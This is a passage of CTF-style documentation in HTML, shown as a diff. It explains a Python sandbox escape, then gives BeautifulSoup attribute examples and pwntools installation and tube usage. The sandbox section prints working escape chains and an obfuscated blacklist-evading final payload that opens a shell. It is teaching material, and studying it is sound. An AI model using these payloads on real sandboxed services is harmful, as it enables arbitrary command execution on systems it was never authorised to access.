+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span>
+<span class="go">&lt;class &#39;object&#39;&gt;</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span>
+<span class="go">(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="go">&lt;class &#39;object&#39;&gt;</span>
+</pre></div>
+</div>
+<p>Now we have the object class. So we can access to all the child classes:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span>
+<span class="go">[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib._BaseExitStack&#39;&gt;, &lt;class &#39;rlcompleter.Completer&#39;&gt;]</span>
+</pre></div>
+</div>
+<p>Let’s find a more suitable way to access the subclasses by index:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">val</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()):</span>
+<span class="gp">... </span>  <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="s1">&#39;: &#39;</span><span class="p">,</span><span class="n">val</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Using __init__ to initialize the class and __globals__ to access the global namespace of the module in which the function was defined.</p>
+<p><a class="reference external" href="https://github.com/kimtruth/GoN-Write-up">pyjail WU</a> was able to call <cite>sys</cite> from <cite>codecs.StreamReaderWriter</cite> class.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&#39;&#39;.__class__.__mro__[1].__subclasses__()[104]
+&lt;class &#39;codecs.StreamReaderWriter&#39;&gt;`
+</pre></div>
+</div>
+<p>So from this namespace we are able to call sys.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">104</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s2">&quot;sys&quot;</span><span class="p">]</span>
+<span class="go">&lt;module &#39;sys&#39; (built-in)&gt;</span>
+</pre></div>
+</div>
+<p>Then it’s easy to import os:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">104</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s2">&quot;sys&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s2">&quot;os&quot;</span><span class="p">]</span>
+<span class="go">&lt;module &#39;os&#39; from &#39;/usr/lib/python3.7/os.py&#39;&gt;</span>
+</pre></div>
+</div>
+<p>And finally using system method to launch a system command and read the flag:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">104</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s2">&quot;sys&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s2">&quot;os&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;cat FLAG&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>However if “.” and “__” are also blacklisted then we can use</p>
+<ul class="simple">
+<li><p>Without . to call method, we can use getattr instead</p></li>
+<li><p>Without __import__, we can use catch_warnings in {}.__class__.__base__.__subclasses__()</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[[</span><span class="n">i</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;catch_warnings&quot;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()]</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="kc">True</span><span class="p">)]</span> <span class="n">this</span> <span class="n">will</span> <span class="n">give</span> <span class="n">me</span> <span class="n">catch_warnings</span>
+<span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[[</span><span class="n">i</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;catch_warnings&quot;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()]</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="kc">True</span><span class="p">)]()</span><span class="o">.</span><span class="n">_module</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s2">&quot;__import__&quot;</span><span class="p">](</span><span class="s2">&quot;os&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;sh&quot;</span><span class="p">)</span> <span class="n">this</span> <span class="n">will</span> <span class="n">give</span> <span class="n">me</span> <span class="n">shell</span>
+</pre></div>
+</div>
+<p>Then we just need to change . to getattr, and _ to dir(0)[0][0]
+Final payload :</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">((),</span> <span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&quot;class&quot;</span><span class="o">+</span><span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="p">),</span> <span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&quot;base&quot;</span><span class="o">+</span><span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="p">),</span> <span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&quot;subcl&quot;</span><span class="o">+</span><span class="s2">&quot;asses&quot;</span><span class="o">+</span><span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="p">)()[</span><span class="nb">getattr</span><span class="p">([</span><span class="nb">getattr</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&quot;name&quot;</span><span class="o">+</span><span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;catch&quot;</span><span class="o">+</span><span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="s2">&quot;warnings&quot;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">((),</span> <span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&quot;class&quot;</span><span class="o">+</span><span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="p">),</span> <span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&quot;base&quot;</span><span class="o">+</span><span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="p">),</span> <span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&quot;subcl&quot;</span><span class="o">+</span><span class="s2">&quot;asses&quot;</span><span class="o">+</span><span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="p">)()],</span> <span class="s2">&quot;index&quot;</span><span class="p">)(</span><span class="kc">True</span><span class="p">)](),</span> <span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="s2">&quot;module&quot;</span><span class="p">),</span> <span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&quot;builtins&quot;</span><span class="o">+</span><span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="p">)[</span><span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s2">&quot;imp&quot;</span><span class="o">+</span><span class="s2">&quot;ort&quot;</span><span class="o">+</span><span class="nb">dir</span><span class="p">(</span><span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="p">](</span><span class="s2">&quot;o&quot;</span><span class="o">+</span><span class="s2">&quot;s&quot;</span><span class="p">),</span> <span class="s2">&quot;sy&quot;</span><span class="o">+</span><span class="s2">&quot;stem&quot;</span><span class="p">)(</span><span class="s2">&quot;sh&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div></blockquote>
+</section>
+<section id="beautifulsoup">
+<h4>BeautifulSoup<a class="headerlink" href="#beautifulsoup" title="Link to this heading"></a></h4>
+<p>A tag may have any number of attributes. The tag &lt;b id=”boldest”&gt; has an attribute “id” whose value is “boldest”. You can access a tag’s attributes by treating the tag like a dictionary:</p>
+<p>tag[‘id’]
+# u’boldest’</p>
+<p>You can access that dictionary directly as .attrs:</p>
+<p>tag.attrs
+# {u’id’: ‘boldest’}</p>
+<p>and read the tag value using</p>
+<p>print(tag.get(‘id’))</p>
+<p>If you have something like</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">form</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;form_product_page&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;form_1362737440&quot;</span> <span class="n">action</span><span class="o">=</span><span class="s2">&quot;/download/791055/164084/&quot;</span> <span class="n">method</span><span class="o">=</span><span class="s2">&quot;get&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nb">input</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;nojssubmit&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;Download&quot;</span> <span class="o">/&gt;</span>
+<span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>and want action value we can</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">action</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;form&#39;</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="s1">&#39;form_product_page&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="pwntools">
+<h3>PwnTools<a class="headerlink" href="#pwntools" title="Link to this heading"></a></h3>
+<p><code class="docutils literal notranslate"><span class="pre">pwntools</span></code> is a CTF framework and exploit development.</p>
+<section id="installing-pwntools">
+<h4>Installing Pwntools<a class="headerlink" href="#installing-pwntools" title="Link to this heading"></a></h4>
+<p>Ubuntu and Debian</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$ </span>apt-get<span class="w"> </span>update
+<span class="gp">$ </span>apt-get<span class="w"> </span>install<span class="w"> </span>python3<span class="w"> </span>python3-pip<span class="w"> </span>python3-dev<span class="w"> </span>git<span class="w"> </span>libssl-dev<span class="w"> </span>libffi-dev<span class="w"> </span>build-essential
+<span class="gp">$ </span>python3<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>--upgrade<span class="w"> </span>pip
+<span class="gp">$ </span>python3<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>--upgrade<span class="w"> </span>pwntools
+</pre></div>
+</div>
+<section id="verifying-installation">
+<h5>Verifying Installation<a class="headerlink" href="#verifying-installation" title="Link to this heading"></a></h5>
+<p>Check if below command works:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$ </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;from pwn import *&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="foreign-architectures">
+<h5>Foreign Architectures<a class="headerlink" href="#foreign-architectures" title="Link to this heading"></a></h5>
+<p>If we want to assemble or disassemble code for foreign architectures, install appropriate <a class="reference external" href="https://pwntools.readthedocs.org/en/latest/install/binutils.html">binutils</a> installation.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$ </span>apt-get<span class="w"> </span>install<span class="w"> </span>binutils-*
+</pre></div>
+</div>
+</section>
+</section>
+<section id="tubes">
+<h4>Tubes<a class="headerlink" href="#tubes" title="Link to this heading"></a></h4>
+<p>Tubes are effectively I/O wrappers for most types of I/O</p>
+<ul class="simple">
+<li><p>Local processes</p></li>
+<li><p>Remote TCP or UDP connections</p></li>
+<li><p>Processes running on a remote server over SSH</p></li>
+<li><p>Serial port I/O</p></li>
+</ul>
+<section id="basic-io">
+<h5>Basic IO<a class="headerlink" href="#basic-io" title="Link to this heading"></a></h5>
+<p>The basic functions</p>
+<section id="receiving-data">
+<h6>Receiving data<a class="headerlink" href="#receiving-data" title="Link to this heading"></a></h6>
+<ul class="simple">
+<li><p><cite>recv(n)</cite> - Receive any number of available bytes</p></li>
+<li><p><cite>recvline()</cite> - Receive data until a newline is encountered</p></li>
+<li><p><cite>recvuntil(delim)</cite> - Receive data until a delimiter is found</p></li>
+<li><p><cite>recvregex(pattern)</cite> - Receive data until a regex pattern is satisfied</p></li>
+<li><p><cite>recvrepeat(timeout)</cite> - Keep receiving data until a timeout occurs</p></li>
+<li><p><cite>clean()</cite> - Discard all buffered data</p></li>
+</ul>
+</section>
+<section id="sending-data">
+<h6>Sending data<a class="headerlink" href="#sending-data" title="Link to this heading"></a></h6>
+<ul class="simple">
+<li><p><cite>send(data)</cite> - Sends data</p></li>
+<li><p><cite>sendline(line)</cite> - Sends data plus a newline</p></li>
+<li><p><cite>sendlineafter(delim, data, timeout=default)</cite> - Sends data after delim</p></li>
+</ul>
+</section>
+<section id="manipulating-integers">
+<h6>Manipulating integers<a class="headerlink" href="#manipulating-integers" title="Link to this heading"></a></h6>
+<ul class="simple">
+<li><p><cite>pack(int)</cite> - Sends a word-size packed integer</p></li>
+<li><p><cite>unpack()</cite> - Receives and unpacks a word-size integer</p></li>
+</ul>
+</section>
+</section>
+<section id="processes-and-basic-features">
+<h5>Processes and Basic Features<a class="headerlink" href="#processes-and-basic-features" title="Link to this heading"></a></h5>
+<p>In order to create a tube to talk to a process, we create a <cite>process</cite> object and give it the name of the target binary. If we want to run a local binary, instead of <code class="docutils literal notranslate"><span class="pre">process('sh')</span></code>, it would be <code class="docutils literal notranslate"><span class="pre">process('./local_binary')</span></code>.</p>
+<p>If we need to provide command-line arguments, or set the environment, additional options are available.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="s1">&#39;echo $MYENV&#39;</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;MYENV&#39;</span><span class="p">:</span> <span class="s1">&#39;MYVAL&#39;</span><span class="p">})</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="c1"># &#39;MYVAL\n&#39;</span>
+</pre></div>
+</div>
+<p>Reading binary data isn’t a problem either.  You can receive up-to a number of bytes with <cite>recv</cite>, or block for an exact count with <cite>recvn</cite>.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="s1">&#39;echo A; sleep 1; echo B; sleep 1; echo C; sleep 1; echo DDD&#39;</span><span class="p">])</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="c1"># &#39;A\n&#39;</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="c1"># &#39;B\nC\n&#39;</span>
+
+<span class="nb">hex</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">unpack</span><span class="p">())</span>
+<span class="c1"># 0xa444444</span>
+</pre></div>
+</div>
+</section>
+<section id="interactive-sessions">
